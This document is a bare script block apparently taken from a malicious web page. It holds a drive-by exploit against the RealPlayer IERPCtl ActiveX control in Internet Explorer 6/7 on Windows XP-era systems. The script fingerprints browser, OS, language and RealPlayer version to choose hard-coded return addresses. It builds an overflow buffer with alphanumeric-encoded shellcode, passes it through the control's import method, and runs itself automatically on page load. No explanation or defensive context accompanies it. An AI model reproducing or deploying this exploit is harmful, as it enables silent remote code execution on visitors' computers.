<script>
var pao1="LLLL\\XXXXXLD";
var pao2=pao1;
var pao3="c:\\Program Files\\NetMeeti";
var pao4="ng\\..\\..\\WINDOWS\\Media\\chime";
var pao5="s.wav";
var pao6=pao3+pao4+pao5;
var pao7="c:\\Program Files\\Ne";
var pao8="tMeeting\\TestSn";
var pao9="d.wav";
var pao0=pao7+pao8+pao9;
var pps1="C:\\WINDOWS\\system32";
var pps2="\\BuzzingBee.wav";
var pps3=pps1+pps2;
var pps4="C:\\WINDOWS\\clock.avi";
var pps5="c:\\Program Files\\NetMeeting";
var pps6="\\..\\..\\WINDOWS\\Media\\tada.wav";
var pps7=pps5+pps6;
var pps8="C:\\WINDOWS\\syste";
var pps9="m32\\LoopyMusic.wav";
var pps0=pps8+pps9;
var sel1="IERPCtl.I";
var sel2="ERPCtl.1";
var sel3=sel1+sel2;
var x1="%75"+"%06"+"%74"+"%04";
var x2="%7f"+"%a5"+"%60";
var x3="%4f"+"%71"+"%a4"+"%60";
var x4="%63"+"%11"+"%08"+"%60";
var x5="%63"+"%11"+"%04"+"%60";
var x6="%79"+"%31"+"%01"+"%60";
var x7="%79"+"%31"+"%09"+"%60";
var x8="%51"+"%11"+"%70"+"%63";
var pplive=[x1,x2,x3,x4,x5,x6,x7,x8];
</script><script>
function RealExploit()
{
	var user=navigator.userAgent["toLowerCase"]();

	if(user.indexOf("msie 6")==-1&&user.indexOf("msie 7")==-1) return;
	if(user.indexOf("nt 5.")==-1) return;

	creobj=sel3;

	try{ Realpao = new window["ActiveXObject"](creobj); }
	catch(error){ return; }

	RealVersion = Realpao.PlayerProperty("PRODUCTVERSION");

	var reading="";
	var tiaozhuan=unescape(pplive[0]);
	var fanhui;

	for(i=0;i<32*148;i++)
		reading+="S";

	if(RealVersion.indexOf("6.0.14.")==-1)
	{
		if(navigator.userLanguage.toLowerCase()=="zh-cn") fanhui=unescape(pplive[1]);
		else if(navigator.userLanguage.toLowerCase()=="en-us") fanhui=unescape(pplive[2]);
		else return;
	}
	else if(RealVersion=="6.0.14.544") fanhui=unescape(pplive[3]);
	else if(RealVersion=="6.0.14.550") fanhui=unescape(pplive[4]);
	else if(RealVersion=="6.0.14.552") fanhui=unescape(pplive[5]);
	else if(RealVersion=="6.0.14.543") fanhui=unescape(pplive[6]);
	else if(RealVersion=="6.0.14.536") fanhui=unescape(pplive[7]);
	else return;

	if(RealVersion.indexOf("6.0.10.")!=-1)
	{
		for(i=0;i<4;i++)
			reading=reading+tiaozhuan;
			reading=reading+fanhui;
	}
	else if(RealVersion.indexOf("6.0.11.")!=-1)
	{
		for(i=0;i<6;i++)
			reading=reading+tiaozhuan;
			reading=reading+fanhui;
	}
	else if(RealVersion.indexOf("6.0.12.")!=-1)
	{
		for(i=0;i<9;i++)
			reading=reading+tiaozhuan;
			reading=reading+fanhui;
	}
	else if(RealVersion.indexOf("6.0.14.")!=-1)
	{
		for(i=0;i<10;i++)
			reading=reading+tiaozhuan;
			reading=reading+fanhui;
	}

	var pplivecode="";
	pplivecode=pplivecode+"TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIxkR0qJPJP3";
	pplivecode=pplivecode+"YY0fNYwLEQk0p47zpfKRKJJKVe9xJKYoIoYolOo";
	pplivecode=pplivecode+"CQv3VsVwLuRKwRvavbFQvJMWVsZzMFv0z8K8mwV";
	pplivecode=pplivecode+"Pnxmmn8mDUBzJMEBsHuN3ULUhmfxW6peMMZM7X";
	pplivecode=pplivecode+"Prf5NkDpP107zMpYE5MMzMj44LqxGONuKpTRrN";
	pplivecode=pplivecode+"WOVYM5mqqrwSMTnoeoty08JMnKJMgPw2pey5MgMW";
	pplivecode=pplivecode+"QuMwrunOgp8mpn8m7PrZBEleoWng2DRELgZMU6REoUJMmLHmz1KUOPCXHmLvflsRWOLNvVrFPfcVyumpRKp4dpJ9VQMJUlxmmnTL2GWOLNQKe6pfQvXeMpPuVPwP9v0XzFr3Ol9vRpzFDxm5NjqVxmLzdLSvTumI5alJMqqrauWJUWrhS3OQWRU5QrENVcE61vPUOVtvTv4uP0DvLYfQOjZMoJP6eeMIvQmF5fLYP1nrQEmvyZkSnFtSooFWTtTpp5oinTWLgOzmMTk8PUoVNENnW0J9mInyWQS3TRGFVt6iEUTgtBwrtTs3r5r5PfEqTCuBgEGoDUtR4CfkvB4OEDc3UUGbVib4Wo5we6VQVouXdcENeStEpfTc7nVoUBdrfnvts3c77r3VwZwyGw7rdj4OS4DTww6tuOUw2F4StTUZvkFiwxQvtsud7Z6BviR1gxUZ4IVgTBfRWygPfouZtCwWqvRHptd4RPFZVOdoSTPjvNSZPu3U2DT559RZpupapn4nsSrO0mToRRPiVNQuqh1uopuP";
	realzh=reading+pao2+pplivecode;
	temp=0x8000; while(realzh["length"] < temp) realzh+="hohoho";
	var arr1=[pao6,pao0,pps3,pps4,pps7,pps0];
	Realpao["import"](arr1[Math.floor(Math["random"]()*6)], realzh, "", 0, 0);
}
RealExploit();
</script>
